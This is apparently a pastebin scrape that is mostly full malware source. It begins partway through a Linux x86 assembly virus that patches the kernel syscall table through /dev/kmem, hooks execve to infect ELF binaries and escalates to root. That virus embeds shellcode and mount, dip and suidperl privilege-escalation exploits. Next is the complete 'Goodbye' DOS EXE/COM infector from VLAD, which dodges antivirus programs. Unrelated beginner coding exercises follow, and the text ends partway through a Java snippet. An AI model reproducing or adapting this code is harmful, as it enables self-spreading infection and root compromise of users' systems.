	addl filesize,%esp                      

	leal 44(%esi),%ecx                # seek to sys_call_table[SYS_execve]
	call seekfilestart

	addl $newexecve-vircode,codeto

	movl $codeto,%ecx                 # write pointer to execve handler
	movl $4,%edx
	call writefile

	call closefile                    # close file

tmpend:
	movl 8(%ebp),%ebx                 # rm argv[0]
	movl (%ebx),%ebx
	call rmfile
	call exit

openfile:
	movl $5,%eax
	int $0x80
	ret

closefile:
	movl $6,%eax
	int $0x80
	ret

readfile:
	movl $3,%eax
	int $0x80
	ret

writefile:
	movl $4,%eax
	int $0x80
	ret

seekfilestart:
	movl $19,%eax
	xorl %edx,%edx
	int $0x80
	ret

rmfile:
	movl $10,%eax
	int $0x80
	ret


exit:
	xorl %eax,%eax
	incl %eax
	int $0x80

waitchild:
	movl $7,%eax
	movl $-1,%ebx
	movl $st,%ecx
	xorl %edx,%edx
	int $0x80
	ret



haxorroot:                                # this routine makes /dev/kmem a+wr
	cmpl $3,%edi
	jz ret2host
	movl $2,%eax                      # fork()
	int $0x80
	orl %eax,%eax                     # are we the child or parent
	jnz parent
	xorl %ebx,%ebx                    # close stdin
	call closefile  
	movl $1,%ebx                      # close stdout
	call closefile  
	movl $2,%ebx                      # close stderr
	call closefile
	cmpl $1,%edi                      # try sploit 1
	jz sploit1
	cmpl $2,%edi                      # try sploit 2
	jz sploit2
	movl $2,%eax                      # try sploit 3
	int $0x80                         # fork
	orl %eax,%eax   
	jne notc1
	movl $2,%eax                      # fork
	int $0x80
	orl %eax,%eax
	jne notc2
	movl $4,r
	jmp allgo
notc2:
	call waitchild                    # wait for child
	movl $8,r
	jmp allgo
notc1:
	call waitchild                    # wait for child
	movl $0,r
allgo:
	subl $1029,%esp                   # allocate space for egg
	mov %esp,%edi
	movl $1028-60,%ecx
	subl r,%ecx
	movb $0x90,%al                    # add nops to egg
	rep
	stosb
	movl $execshell,%esi              # add shell to egg
	movl $60,%ecx
	rep
	movsb
	movl %esp,%eax                    # add return address
	addl $1200,%eax
	stosl
	xorl %eax,%eax
	stosb
	movl $11,%eax                     # execute mount sploit
	movl $mountpath,%ebx
	movl $args,%ecx
	movl %esp,4(%ecx)
	movl $env,%edx
	int $0x80
	call exit

execshell:
.string ""\xeb\x21\x5b\x31\xc9\x66\xb9\xff\x01\x31\xc0\x88\x43\x09\x88\x43\x14\xb0\x0f\xcd\x80\x31\xc0\xb0\x0a\x8d\x5b\x0a\xcd\x80\x33\xc0\x40\xcd\x80\xe8\xda\xff\xff\xff/dev/kmemx/etc/mtab~""
mountpath:
.string ""/sbin/mount""
r:
.long 0
args:
.long mountpath
.long 0
.long 0
env:
.long 0

dipname:
.string ""/tmp/t.dip""
execthis:
.string ""/bin/sh""
parm1:
.string ""-c""
pathdip:
.string ""/sbin/dip /tmp/t.dip""
args1:
.long execthis
.long parm1
.long pathdip
.long 0
chkey:
.string ""chatkey ""
hsname:
.string ""/tmp/hs""
hsdat:
.string ""#!/bin/sh\nchmod 666 /dev/kmem\n""
shell:
.string ""\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/tmp/hs""
sploit1:
	subl $1024,%esp                  # allocate space for egg
	movl %esp,%edi
	movl $chkey,%esi                 # add ""chatkey "" to egg
	movsl
	movsl
	movl %esp,%eax
	subl $224,%eax                   # add return address to egg
	movl $34,%ecx
	rep
	stosl
	movl $512-144,%ecx               # add nops to egg
	movb $0x90,%al
	rep
	stosb
	movl $shell,%esi                 # add shell to egg
	movl $50,%ecx
	rep
	movsb
	movl $10,%al                     # add \n to egg
	stosb
	movl $dipname,%ebx               # create dip script
	movl $577,%ecx
	movl $448,%edx
	call openfile
	movl %eax,%ebx
	movl %esp,%ecx
	pushl %edx
	movl $562,%edx                   # write script code
	call writefile
	popl %edx
	call closefile        
	movl $hsname,%ebx                # create shell file to execute
	movl $577,%ecx
	movl $448,%edx
	call openfile
	movl %eax,%ebx
	movl $hsdat,%ecx
	movl $30,%edx
	call writefile                   # write shell contents
	call closefile        
	movl $2,%eax                     # fork
	int $0x80
	orl %eax,%eax
	jne p1
	movl $execthis,%ebx              # execute sploit
	movl $args1,%ecx
	movl 12(%ebp),%edx
	movl $11,%eax
	int $0x80
	call exit        
p1:     call waitchild                   # wait for sploit to finish
	movl $dipname,%ebx               # remove dip script
	call rmfile
	movl $hsname,%ebx                # remove shell script
	call rmfile
	call exit

perlname:
.string ""/tmp/b""

perldat:
.string ""#!/usr/bin/suidperl -U\n$ENV{PATH}=\""/bin:/usr/bin\"";\n$>=0;$<=0;\nexec(\""chmod 666 /dev/kmem\"");\n""

perlargs:
.long perlname
perlenv:
.long 0

sploit2:
	movl $perlname,%ebx                  # create perl script
	movl $577,%ecx
	movl $488,%edx
	call openfile
	movl %eax,%ebx
	movl $perldat,%ecx                   # write perl contents
	movl $91,%edx
	call writefile
	movl $94,%eax
	movl $2496,%ecx
	int $0x80
	call closefile        
	movl $2,%eax                         # fork
	int $0x80
	orl %eax,%eax
	jne p2
	movl $11,%eax                        # execute the sploit
	movl $perlname,%ebx
	movl $perlargs,%ecx
	movl $perlenv,%edx
	int $0x80
	call exit       
p2:
	call waitchild                       # wait for the child
	movl $perlname,%ebx                  # remove perl script
	call rmfile
	call exit       

parent: 
	incl %edi
	call waitchild  # wait for child process to finish
	jmp opendevkmem

taskptr:
.long 0

otaskptr:
.long 0

codeto:
.long 0

thissym:
.string ""sys_call_table""

thissym1:
.string ""current""

thissym2:
.string ""kmalloc""

devkmem:
.string ""/dev/kmem""

e_entry:
.long 0x666

infect:                                   # opens and infects the file in %ebx
	pushl $2                          # open %ebx
	pushl %ebx 
	call 5*4(%ebp)
	popl %ebx
	popl %ebx
	orl %eax,%eax                     # make sure it's opened
	js e1
	movl %eax,%ebx
	push %fs
	push %ds
	pop %fs
	leal e_entry(%edi),%ecx                 # read in elf hdr marker
	movl $4,%edx
	pushl %edx
	pushl %ecx
	pushl %ebx
	call 3*4(%ebp)  
	addl $12,%esp
	cmpl $0x464c457f,e_entry(%edi)          # make sure it's elf
	jnz e2
	pushl $0                                # seek to entrypoint storage
	pushl $24
	pushl %ebx
	call 19*4(%ebp)
	addl $12,%esp
	leal e_entry(%edi),%ecx                 # read the entrypoint
	pushl $4
	pushl %ecx
	pushl %ebx
	call 3*4(%ebp)
	addl $12,%esp
	andl $0xffff,e_entry(%edi)
	movl e_entry(%edi),%ecx               # seek to entrypoint
	pushl $0
	pushl %ecx
	pushl %ebx
	call 19*4(%ebp)
	popl %eax
	popl %eax
	popl %eax
	subl $main-vircode,%esp               # allocate space on the stack
	movl %esp,%esi
	pushl $main-vircode                     # read in host bytes
	pushl %esi
	pushl %ebx
	call 3*4(%ebp)
	addl $12,%esp
	movl vircode(%edi),%eax
	cmpl %eax,(%esi)                        # check if file infected
	jz e3

	pushl $2                                # seek to end of file
	pushl $0
	pushl %ebx
	call 19*4(%ebp) 
	addl $12,%esp
	movl filesize(%edi),%eax
	pushl %eax                              
	leal virend(%edi),%eax                  # write virus body to end
	pushl %eax
	pushl %ebx
	call 4*4(%ebp)
	addl $12,%esp
	pushl $2                                # seek to end of file
	pushl $0
	pushl %ebx
	call 19*4(%ebp) 
	addl $12,%esp
	pushl $main-vircode                   # write org bytes
	pushl %esi
	pushl %ebx
	call 4*4(%ebp)  
	addl $12,%esp
	movl e_entry(%edi),%ecx                 # seek to entrypoint
	pushl $0
	pushl %ecx
	pushl %ebx
	call 19*4(%ebp)
	addl $12,%esp
	leal vircode(%edi),%ecx                 # write virus
	pushl $main-vircode
	pushl %ecx
	pushl %ebx
	call 4*4(%ebp)
	addl $12,%esp
e3:
	addl $main-vircode,%esp               # deallocate space off stack
e2:
	pop %fs
	pushl %ebx
	call 6*4(%ebp)                          # close file
	popl %eax
	call 36*4(%ebp)                         # sync
e1:
	ret

uidsave:
.word 0
euidsave:
.word 0
suidsave:
.word 0
fsuidsave:
.word 0

gidsave:
.word 0
egidsave:
.word 0
sgidsave:
.word 0
fsgidsave:
.word 0

saveuids:
	movl current(%edi),%eax
	movl (%eax),%eax
	leal 0x310(%eax),%esi
	pushl %edi
	leal uidsave(%edi),%edi
	movl $4,%ecx
	rep
	movsl
	popl %edi
	ret

makeroot:
	movl current(%edi),%eax
	movl (%eax),%eax
	pushl %edi
	leal 0x310(%eax),%edi
	xorl %eax,%eax
	movl $4,%ecx
	rep
	stosl
	popl %edi
	ret

loaduids:
	movl current(%edi),%eax
	movl (%eax),%eax
	leal uidsave(%edi),%esi
	pushl %edi
	leal 0x310(%eax),%edi
	movl $4,%ecx
	rep
	movsl
	popl %edi
	ret

.global newexecve
newexecve:
	pushl %ebp
	movl %esp,%ebp
	pushl %ebx
	movl 8(%ebp),%ebx                   # get the filename to infect
	pushal
	cmpl $0x666,%ebx                    # is this our service routine ?
	jnz notserv
	popal
	incl 8(%ebp)                        # yes..inc the pointer and return
	popl %ebx
	popl %ebp
	ret
notserv:
	call ring0recalc                    # no.. calculate ring 0 delta
ring0recalc:
	popl %edi
	subl $ring0recalc,%edi
	movl syscalltable(%edi),%ebp        # put *sys_call_table in %ebp
	call saveuids                       # save the callers uid/euid...
	call makeroot                       # make the caller root
	call infect                         # infect the file
	call loaduids                       # restore the callers uid/euid...
hookoff:
	popal
	popl %ebx
	popl %ebp
.byte   0xe9                                # goto original execve
orgexecve:
.long   0
aftreturn:

syscalltable:
.long 0

current:
.long 0

.global hookspace
hookspace:
	push %ebp
	pushl %ebx
	pushl %ecx
	pushl %edx
	movl %esp,%ebp

	pushl $3
.byte   0x68
virendvircodefilesize:
.long   0
.byte   0xb8               # movl $xxx,%eax     
kmalloc:
.long   0
	call %eax

	movl %ebp,%esp
	popl %edx
	popl %ecx
	popl %ebx
	popl %ebp       
	ret     

.global endhookspace
endhookspace:
.global virend
virend:
"
iWJUJF2q,Maximum Multiple,DiYane,Python,Sunday 2nd of July 2023 09:52:03 AM CDT,"divisor = int(input())
boundary = int(input())

N = (boundary // divisor) * divisor

print(N)"
x1Rx3GY4,VLAD Magazine - Issue #7 - ARTICLE.2_2 - Goodbye Virus Virus  Source Code,FlyFar,ASM (NASM),Sunday 2nd of July 2023 09:51:31 AM CDT,";       Goodbye!
;       by Qark/VLAD
;
; This virus is to say goodbye to all my friends in the virus scene.
;
;
; Infects EXE's and COM's, using CRC32 on any data comparisons.
;
; Ideas stolen from Zhengxi - but not the code!
;
; Compile with a86 as ever.
;

        org     0

        ;Below is stupid stuff
        sub     ax,ax
        mov     cx,ax
        dec     ax
        sub     ch,al
        mov     dx,cx
        rol     cx,1
        mov     dl,al
        div     cx
        div     cx
        div     cx
        div     cx
        div     cx
        dec     cx
        add     dx,ax
        div     cx
        div     cx
        div     cx
        xchg    dx,ax

        mov     si,100h
        org     $-2
delta   dw      100h

        mov     ax,51bdh
        int     21h
        cmp     ax,0bd51h
        je      notvirus

        mov     ax,ds
        add     ax,dx
        mov     ds,ax
        xor     di,di

        cmp     byte ptr [di],'Z'
        jne     notvirus

        sub     word ptr [di+3],(offset vmemsize /16)+2
        sub     word ptr [di+12h],(offset vmemsize/16)+2
        
        ;Because so many people complained i've fixed my MCB code :)
        ;UMB's now survive..
        mov     byte ptr [di],'M'
        add     ax,word ptr [di+3]
        inc     ax
        mov     ds,ax
        mov     byte ptr ds:[di],'Z'
        mov     word ptr ds:[di+1],8
        mov     word ptr ds:[di+3],(offset vmemsize/16)+1
        inc     ax

        push    es
        pop     ds
        mov     es,ax           ;ax=es=virus segment
        
        cld
        push    si
        mov     cx,offset vpsize
        db      2eh             ;cs:
        rep     movsb
        
        push    ds
        mov     ds,cx           ;ds=0
        mov     es,ax
        mov     si,21h*4
        mov     di,offset i21
        movsw
        movsw
        mov     word ptr [si-4],offset virushandler
        mov     word ptr [si-2],ax

        pop     ds
        push    ds
        pop     es
        pop     si
notvirus:
        push    cs
        pop     ds

        cmp     si,16
        jb      exefile

        mov     di,101h
        mov     ax,word ptr [si+orig5]
        mov     word ptr [di-1],ax
        mov     ax,word ptr [si+orig5+2]
        mov     word ptr [di+1],ax
        mov     al,byte ptr [si+orig5+4]
        mov     byte ptr [di+3],al

        dec     di
        xor     ax,ax
        jmp     di

        db      ""Goodbye everyone!"",0dh,0ah
        db      ""Viruses were fun, but I've got other things I'd like to do"",0dh,0ah
        db      ""Qark/VLAD"",0dh,0ah

exefile:
        mov     ax,es
        add     ax,10h
        add     word ptr cs:[si+offset exejump+2],ax
        jmp     $+2
        push    es
        pop     ds
        add     ax,0
        org     $-2
origss  dw      0
        mov     ss,ax
        mov     sp,0
        org     $-2
origsp  dw      0
        xor     ax,ax
        xor     bx,bx
        xor     cx,cx
        xor     dx,dx
        xor     si,si
        xor     di,si

        db      0eah
exejump dd      0

virushandler:
        xchg    ah,al
        cmp     ax,0bd51h
        jne     notres
        iret
notres:
        cmp     al,4bh
        je      infect
        cmp     al,3dh
        je      infect
        cmp     al,43h
        je      infect
out21:
        xchg    ah,al
        db      0eah
i21     dd      0

infect:
        pushf
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es

        cld
        cmp     ah,6ch
        je      no6cchange
        mov     si,dx
no6cchange:
        push    cs
        pop     es
        mov     di,offset filename
        mov     ah,60h
        call    int21h
        jnc     goodname
badname1:
        jmp     badname
goodname:
        push    cs
        pop     ds

        call    check_name
        jc      badname1

        mov     dx,offset filename
        mov     ax,3d02h
        call    int21h
        jc      badname1
        xchg    bx,ax

        mov     ah,3fh
        mov     cx,18h
        mov     dx,offset header
        call    int21h

        mov     si,offset header
        mov     cx,2
        call    crc16
        
        cmp     ax,6bb5h                ;MZ
        je      infexe
        cmp     ax,95fah                ;ZM
        je      infexe
infcom:
        mov     si,offset header
        mov     cx,5
        call    crc16
        or      ax,ax
        jz      badclose                 ;Infected!

        call    lseekend

        or      dx,dx
        jnz     badclose
        cmp     ax,64000
        ja      badclose
        cmp     ax,1001
        jb      badclose

        push    ax
        sub     ax,3
        mov     word ptr combyte+1,ax
        pop     ax
        add     ax,100h
        mov     word ptr delta,ax

        mov     ah,40h
        mov     cx,offset vpsize
        xor     dx,dx
        call    int21h
        jc      badclose
        
        call    lseek0

        ;to mark infection, crc check the e9,xx,xx and put the crc
        ;after it, before writing to file.

        mov     si,offset combyte
        mov     cx,3
        call    crc16

        mov     word ptr combyte+3,ax

        mov     ah,40h
        mov     cx,5
        mov     dx,offset combyte
        call    int21h
        
badclose:
        mov     ah,3eh
        call    int21h
        jmp     badname
infexe:
        mov     si,offset header
        mov     cx,14h
        call    crc16
        or      ax,ax
        jz      badclose                 ;already infected
        
        cmp     word ptr [si+18h],40h
        je      badclose
        cmp     word ptr [si+0ch],-1
        jne     badclose

        mov     ax,word ptr [si+0eh]
        mov     word ptr origss,ax
        mov     ax,word ptr [si+10h]
        mov     word ptr origsp,ax

        mov     ax,word ptr [si+14h]
        mov     word ptr exejump,ax
        mov     ax,word ptr [si+16h]
        mov     word ptr exejump+2,ax

        call    lseekend
        mov     cx,16
        div     cx
        sub     ax,word ptr [si+8]
        mov     word ptr [si+14h],dx
        mov     word ptr [si+16h],ax
        mov     word ptr delta,dx
        add     dx,offset vmemsize
        and     dx,0fffeh
        inc     ax

        mov     word ptr [si+0eh],ax
        mov     word ptr [si+10h],dx

        mov     ah,40h
        mov     cx,offset vpsize
        xor     dx,dx
        call    int21h
        jc      badclose

        call    lseekend

        mov     cx,512
        div     cx
        or      dx,dx
        jz      nopagefix
        inc     ax
nopagefix:
        mov     word ptr [si+4],ax
        mov     word ptr [si+2],dx

        mov     cx,12h
        call    crc16
        mov     word ptr [si+12h],ax

        call    lseek0

        mov     ah,40h
        mov     cx,1ch
        mov     dx,si
        call    int21h
        jmp     badclose

badname:
        pop     es
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        popf
        jmp     out21


;;;;---------->
lseekend:
        mov     ax,4202h
        jmp     lseek
lseek0:
        mov     ax,4200h
lseek:
        xor     cx,cx
        cwd
        call    int21h
        ret
;;;;---------->
check_name:
        mov     si,offset filename
        cmp     byte ptr [si+2],'/'     ;""CON"" etc gives a reverse slash.
        je      fail_name               ;Will mess up my backslash checking
                                        ;if a program tries to open one.
findstrend:
        lodsb
        cmp     al,0
        jne     findstrend
        dec     si
        mov     word ptr zpointer,si
        std
findslend:
        lodsb
        cmp     al,'\'
        jne     findslend
        cld
        lodsw
        mov     word ptr fpointer,si
        ;si points to file name name.ext hopefully

        mov     cx,word ptr zpointer
        sub     cx,si

        call    crc16
        ;ax = crc value
        cmp     ax,0bd8h                ;tbscan.exe
        je      fail_name
        cmp     ax,0f07fh               ;avp.exe
        je      fail_name
        cmp     ax,5e88h                ;f-prot.exe
        je      fail_name
        cmp     ax,3cb2h                ;scan.exe
        je      fail_name
        cmp     ax,86a5h                ;dv.exe
        je      fail_name
        cmp     ax,0ba8eh               ;progman.exe
        je      fail_name

        mov     si,word ptr zpointer
        cmp     byte ptr [si-4],'.'
        jne     fail_name

        sub     si,3
        mov     cx,3
        call    crc16

        cmp     ax,0e6ebh               ;exe
        je      pass_name
        cmp     ax,0d105h               ;com
        je      pass_name
        jmp     fail_name

pass_name:
        clc
        ret
fail_name:
        stc
        ret
;;;;---------->
crc16   proc    near
;on entry cx=number of bytes to checksum
;         si=pointer to bytes
;on exit ax contains the checksum
;I stole this code from some PD sources I got off a BBS.

        push    bx
        push    cx
        push    si
        push    di

        call    gentable

        xor     ax,ax
crc16loop:
        xor     bh,bh
        mov     bl,al
        lodsb
        xor     bl,al
        shl     bx,1
        mov     bx,word ptr [bx+crc16tab]
        xor     bl,ah
        mov     ax,bx
        loop    crc16loop

        pop     di
        pop     si
        pop     cx
        pop     bx

        ret

crc16   endp
;;;;---------->
Gentable        proc    near
;Generates the 16bit crc table.

        push    ax
        push    cx
        push    dx
        push    di

        mov     di,offset crc16tab
        xor     cx,cx
outgen:
        xor     ax,ax
        mov     al,cl
        push    cx
        mov     cx,8
calcloop:
        clc
        rcr     ax,1
        jnc     nocrcxor
        xor     ax,0a001h
nocrcxor:
        loop    calcloop
        mov     word ptr [di],ax
        inc     di
        inc     di
        pop     cx
        inc     cx
        cmp     cx,100h
        jne     outgen

        pop     di
        pop     dx
        pop     cx
        pop     ax
        ret
Gentable        endp
;;;;---------->
int21h:
        pushf
        call    dword ptr cs:i21
        ret
;;;;---------->

combyte         db      0e9h,0,0,0,0
header:
orig5           db      0cdh,20h,0,0,0
vpsize:
                db      18h - 5 dup (0)

zpointer        dw      0       ;the offset of the end of the filename
fpointer        dw      0       ;the offset of the start of the filename

filename        db      128 dup (0)

crc16tab        db      100h*2 dup (0)

vmemsize:

"
HYmgPxXm,coolblue.nl - Remove cookie wall,EdFrees,CSS,Sunday 2nd of July 2023 09:41:54 AM CDT,".modal-box {
	display: none !important;
}"
eKwKu7H3,Chat Codes,DiYane,Python,Sunday 2nd of July 2023 09:40:45 AM CDT,"n = int(input())

for _ in range(n):
    number = int(input())

    if number == 88:
        print(""Hello"")
    elif number == 86:
        print(""How are you?"")
    elif number < 88:
        print(""GREAT!"")
    else:
        print(""Bye."")"
EX4a1XzX,"Kaggle - Exercise 5 - Histplot, kdeplot, jointplot",makispaiktis,Python,Sunday 2nd of July 2023 09:26:08 AM CDT,"import pandas as pd
pd.plotting.register_matplotlib_converters()
import matplotlib.pyplot as plt
# %matplotlib inline
import seaborn as sns


# 1. Read the file
cancer_filepath = ""../input/cancer.csv""
cancer_data = pd.read_csv(cancer_filepath, index_col=""Id"")
print(cancer_data.head())

# In the first five rows of the data, what is the largest value for 'Perimeter (mean)'?
max_perim = 87.46
# What is the value for 'Radius (mean)' for the tumor with Id 8510824?
mean_radius = 9.504

# 2. Histogram containing the 2 values of the class (class=""Diagnosis"")
sns.histplot(data=cancer_data, x=""Area (mean)"", hue=""Diagnosis"")

# 3. KDE plot containing the 2 values of the class (class=""Diagnosis"")
sns.kdeplot(data=cancer_data, x=""Radius (worst)"", hue=""Diagnosis"")

# 4. 2D-KDE plot (jointplot) containing the 2 values of the class (class=""Diagnosis"")
sns.jointplot(data=cancer_data, x=""Radius (worst)"", y=""Area (mean)"")
sns.jointplot(data=cancer_data, x=""Radius (worst)"", y=""Area (mean)"", kind=""hist"")
sns.jointplot(data=cancer_data, x=""Radius (worst)"", y=""Area (mean)"", kind=""kde"")
"
1bnw3S3z,Jenny's Secret Message,DiYane,Python,Sunday 2nd of July 2023 09:19:59 AM CDT,"name = input()

if name == ""Johnny"":
    print(""Hello, my love!"")
else:
    print(""Hello,"", name + ""!"")
"
3YM7rcsw,months_2_00,dllbridge,C,Sunday 2nd of July 2023 09:15:32 AM CDT,"
//  1) The beginning of the file ""main.cpp""
//     - - - - - - - - - - - - - - - - - -

#include  <stdio.h>
#include  ""resource/Cdate.h""




////////////////////////////////////////////////////
int main()                                        // 
{

	for(int i = 1; i <= 12; i++)
	{
	   printf(""%10s has %d days\n"", Month[i].pszMon, 
									Month[i].nDays);
    }



return 0;	
}



//  2) The beginning of the file ""Cdate.h""
//    - - - - - - - - - - - - - - - - - -

#include   <windows.h>



/////////////////////////////////////////////////
class Cdate
{
	
	static  int  nCounter;                     // Будет подсчитывать и хранить кол-во созданных объектов - месяцев
	
    public:	
	int          nDays;                        //                                        Кол-во дней в этом месяце
	
	const char *pszMon;  	                   //                                                  Название месяца
	
	
	////////методы///////
	Cdate();                                   //      Инициализирует 12 объектов класса параметрами 12-ти месяцев.
   ~Cdate();                                   //      Деструктор пригодится для паузы перед завершением программы.

};



extern Cdate   Month[14];                      //                           Массив месяцев (объектов класса Cdate)  







//  3) The beginning of the file ""Cdate.cpp""
//     - - - - - - - - - - - - - - - - - -

#include   <stdlib.h>
#include    <stdio.h>
#include   <string.h>
#include  <windows.h>
#include    ""Cdate.h""


int         connDll(); 

extern int (*_retDate)(const char *psz, int n);

extern  HINSTANCE   hDll;

//////////////////////////////////////////////////////////


int  Cdate::nCounter = -1;

Cdate    Month[14];                                                                                   //  12 месяцев


//            Инициализирует 12 объектов класса параметрами 12-ти месяцев.
/////////////////////////////////////////////////////////////////////////
Cdate::Cdate()                                                         //
{
	
	   int i = ++ nCounter;
	         
	   if(i <= 12)
	   {
          if(i == 0) 
		  
			 connDll();                    //  Подключаем dll-библиотеку
			 
	
		  Month[i].pszMon =  (const char*)_retDate(""month"", i); 
		  Month[i].nDays  =               _retDate( ""days"", i); 			   	  
	   }
}



//            Деструктор пригодится для паузы перед завершением программы.
/////////////////////////////////////////////////////////////////////////
Cdate::~Cdate()                                                        //
{
	if(nDays == 28)    
	{
	   printf("" - - - - - - - - - - -\n"");	
	   printf(""%s destructor works.  \n"", pszMon);	
	   system(""pause"");	
	   
	   FreeLibrary(hDll);
	}
	
}







//  4) The beginning of the file ""connect.cpp""
//    - - - - - - - - - - - - - - - - - - - -


#include   <windows.h>
#include     <stdio.h>


HINSTANCE hDll;



int (*_retDate)(const char *psz, int n) = 0;


////////////////////////////////////////////////////
int connDll()                                        // 
{ 


    hDll = LoadLibrary(""resource/dll/my.dll""); 
    
    if(hDll == 0) 
	{
		printf(""Error load of dll-library!\n"");

        return 0; 
    }
    
   _retDate = (int(*)(const char *, int) )GetProcAddress(hDll, ""_retDate"");
   
    
    if(_retDate == 0) 
    {
		printf(""Error load func a.\n"");
        FreeLibrary(hDll);
        return 0; 
    }

return 0; 
}   





//  5) The beginning of the file ""dllmain.cpp""
//    - - - - - - - - - - - - - - - - - - - -

// Replace ""dll.h"" with the name of your header 

#include ""dll.h""
#include <windows.h>


int  nDays[14] = {0, 31, 28, 31, 30, 31, 30,                           //     Кол-во дней в месяцах для невисокосного 
                     31, 31, 30, 31, 30, 31, 0};                       //                                      года.

const char *pszMonths[14] = {        ""Zero"",                           // The element with index 0 will not be used, 
                                  ""January"",
                                 ""February"",
				                    ""March"",
						            ""April"",
						              ""May"",
						             ""June"",
						             ""July"",
					               ""August"",
					            ""September"",
					              ""October"",
				                 ""November"",
				                 ""December"" 
						    };




DllClass::DllClass()
{

}


DllClass::~DllClass ()
{

}


BOOL APIENTRY DllMain (HINSTANCE hInst     /* Library instance handle. */ ,
                       DWORD reason        /* Reason this function is being called. */ ,
                       LPVOID reserved     /* Not used. */ )
{
    switch (reason)
    {
		
      case DLL_PROCESS_ATTACH:
                                break;

      case DLL_PROCESS_DETACH:
                                break;

      case DLL_THREAD_ATTACH:
                                break;

      case DLL_THREAD_DETACH:
                                break;
    }

    return TRUE;                                                          // Returns TRUE on success, FALSE on failure 
}






///////////////////////////////////////
extern ""C"" __declspec(dllexport)
////////////////////////////////////////////////////////////
int _retDate(const char *psz, int n)
{
	
	if( strcmp(""month"", psz) == 0)  return (int)pszMonths[n];	
	if( strcmp( ""days"", psz) == 0)  return          nDays[n];		
}




"
1CduPa5K,Patterns,DiYane,Python,Sunday 2nd of July 2023 09:06:46 AM CDT,"num = int(input())

for i in range(1, num + 1):
    print('*' * i)

for i in range(num - 1, 0, -1):
    print('*' * i)"
CsmBdPkP,Shopping,DiYane,Python,Sunday 2nd of July 2023 09:02:31 AM CDT,"budget = int(input())

while True:
    line = input()
    if line == ""End"":
        print(""You bought everything needed."")
        break

    price = int(line)

    if budget >= price:
        budget -= price
    else:
        print(""You went in overdraft!"")
        break"
AnjqF1Cq,ctxupdate,goldfiction,Lua,Sunday 2nd of July 2023 08:56:55 AM CDT,"shell.run(""pastebin get AZWuZ1k1 wireless"")
shell.run(""pastebin get VhJJEXcx ct"")
shell.run(""pastebin get i9kdGdz8 ctx"")
shell.run(""pastebin get qWYdsRXL taco"")
shell.run(""pastebin get ivRxy3Mp market"")
shell.run(""pastebin get aMgfwt8u tunn"")
shell.run(""pastebin get j4nACRJf OreQuarry"")
shell.run(""pastebin get Yi2zDkU6 rednetreceive"")
"
WrV3u7ky,Number Between 1 and 100,DiYane,Python,Sunday 2nd of July 2023 08:56:44 AM CDT,"num = float(input())

while num < 1 or num > 100:
    num = float(input())

print(f""The number {num} is between 1 and 100"")"
vjZNLx0F,Even Numbers,DiYane,Python,Sunday 2nd of July 2023 08:43:41 AM CDT,"n = int(input())

all_even = True

for _ in range(n):
    num = int(input())
    if num % 2 != 0:
        print(num, ""is odd!"")
        exit()
    else:
        all_even = all_even and True

if all_even:
    print(""All numbers are even."")
"
WZ8uDVd5,Untitled,Don_Mag,Swift,Sunday 2nd of July 2023 08:34:37 AM CDT,"class LayoutTestVC: UIViewController {
	
	override func viewDidLoad() {
		super.viewDidLoad()
		
		let testView = YourCustomView(frame: .init(x: 0, y: 0, width: 300, height: 160))
	}
	
}

class ContentView: UIView {
}

class YourCustomView: UIView {
	
	var contentView: ContentView!
	let thumbWidth: CGFloat = 40.0
	
	override init(frame: CGRect) {
		super.init(frame: frame)
		setupContentView()
	}
	required init?(coder: NSCoder) {
		super.init(coder: coder)
		setupContentView()
	}
	
	private func setupContentView() {
		contentView = ContentView(frame: .zero)
		contentView.translatesAutoresizingMaskIntoConstraints = false
		addSubview(contentView)
		contentView.leftAnchor.constraint(equalTo: leftAnchor, constant:thumbWidth).isActive = true
		contentView.rightAnchor.constraint(equalTo: rightAnchor, constant: -thumbWidth).isActive = true
		contentView.topAnchor.constraint(equalTo: topAnchor).isActive = true
		contentView.bottomAnchor.constraint(equalTo: bottomAnchor).isActive = true
		contentView.clipsToBounds = true
		contentView.isUserInteractionEnabled = true
		contentView.layoutIfNeeded()
		NSLog(""ContentView bounds \(contentView.bounds), view bounds \(self.bounds)"")
	}
	
}

"
Vqy4kipb,Word Reverse,DiYane,Python,Sunday 2nd of July 2023 08:32:56 AM CDT,"word = input()
reversed_word = word[::-1]
print(reversed_word)"
1XsRmziS,Largest Of Three Numbers,DiYane,Python,Sunday 2nd of July 2023 08:24:15 AM CDT,"num1 = int(input())
num2 = int(input())
num3 = int(input())

largest = max(num1, num2, num3)

print(largest)"
3JRpp3M9,Number_Definer,DiYane,Python,Sunday 2nd of July 2023 08:13:05 AM CDT,"number = float(input())
if number == 0:
    print(""zero"")
elif number > 0:
    if abs(number) < 1:
        print(""small positive"")
    elif number > 1000000:
        print(""large positive"")
    else:
        print(""positive"")
else:
    if abs(number) < 1:
        print(""small negative"")
    elif number < -1000000:
        print(""large negative"")
    else:
        print(""negative"")
"
nTzuY3sp,JudgeMessage8,CR7CR7,Java,Sunday 2nd of July 2023 08:09:01 AM CDT,"import java.util.*;
import java.util.concurrent.atomic.AtomicInteger;
public class MoreEx2 {
  public static void main(String[] args) {
    Scanner scan = new Scanner(System.in); 
    // A map to store the contests and their participants with points 
    Map<String , Map<String, Integer>> contentUserPointsMap = new LinkedHashMap<>();
    // A map to store the participants and their total points
    Map<String , Integer> individualStatistic = new LinkedHashMap<>();
    // A list to store the participants in order of input
    List<String>
 orderOfInput = new ArrayList<>();

String input = scan.nextLine();
while(!input.equals(""no more time"")){
  // Split the input by "" -> "" to get the username, contest name and points
  String[] tokens = input.split("" -> "");
  String username = tokens[0];
  String contest = tokens[1];
  int points = Integer.parseInt(tokens[2]);
  
  // If the participant is not in the list, add them
  if (!orderOfInput.contains(username)) {
    orderOfInput.add(username);
  }
  
  // If the contest is not in the map, add it with an empty map as value
  contentUserPointsMap.putIfAbsent(contest,new HashMap<>());
  
  // Get the map of participants for this contest
  Map<String, Integer> contestParticipants = contentUserPointsMap.get(contest);
  
  // If the participant is already in the map, update their points if they are higher
  if (contestParticipants.containsKey(username)) {
    int currentPoints = contestParticipants.get(username);
    if (points > currentPoints) {
      // Update the contest score
      contestParticipants.put(username, points);
      // Update the total score by adding the difference
